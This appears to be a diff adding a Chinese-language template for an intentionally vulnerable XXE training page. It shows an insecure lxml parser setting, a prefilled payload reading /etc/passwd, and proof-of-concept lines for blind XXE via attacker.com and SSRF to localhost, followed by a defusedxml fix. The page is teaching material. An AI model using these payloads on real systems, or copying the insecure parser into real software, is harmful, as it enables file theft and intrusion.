@@ -1,0 +1,65 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="content">
+    <div style="margin-bottom: 20px;">
+        <a href="/" class="btn btn-primary">← 返回首页</a>
+        <a href="/vuln/xxe" class="btn btn-primary">查看详情</a>
+    </div>
+
+    <h1>📄 XXE (XML外部实体注入) 演示</h1>
+    <div class="alert alert-danger">
+        <strong>⚠️ 危险环境</strong>
+        这是一个存在XXE漏洞的XML解析器演示。请仅在学习和授权的测试环境中使用。
+    </div>
+
+    <div class="code-block" style="margin-bottom: 20px;">
+        <strong>易受攻击的代码：</strong>
+        <pre><code># 危险：启用实体解析
+parser = etree.XMLParser(resolve_entities=True)
+tree = etree.fromstring(xml_string, parser)</code></pre>
+    </div>
+
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+        <div>
+            <h3>📝 XML解析测试</h3>
+            <form method="POST" style="margin-top: 15px;">
+                <div class="form-group">
+                    <label for="xml">输入XML：</label>
+                    <textarea id="xml" name="xml" rows="10" required><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo></textarea>
+                </div>
+                <button type="submit" class="btn btn-danger">解析XML</button>
+            </form>
+
+            {% if result %}
+            <div style="margin-top: 15px;">
+                <h4>解析结果：</h4>
+                <div style="padding: 10px; background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 5px;">
+                    <pre style="margin: 0;">{{ result | safe }}</pre>
+                </div>
+            </div>
+            {% endif %}
+        </div>
+
+        <div>
+            <h3>💡 测试提示</h3>
+            <div class="code-block">
+                <p><strong>POC 测试示例：</strong></p>
+                <p>1. 读取本地文件：</p>
+                <p><!ENTITY xxe SYSTEM "file:///etc/passwd"></p>
+                <p>2. Blind XXE：</p>
+                <p><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"></p>
+                <p>3. SSRF组合：</p>
+                <p><!ENTITY xxe SYSTEM "http://127.0.0.1:22"></p>
+                <p style="margin-top: 10px;"><strong>修复方案：</strong></p>
+                <p>from defusedxml.lxml import fromstring</p>
+                <p>tree = fromstring(xml_string)  # 禁用实体解析</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
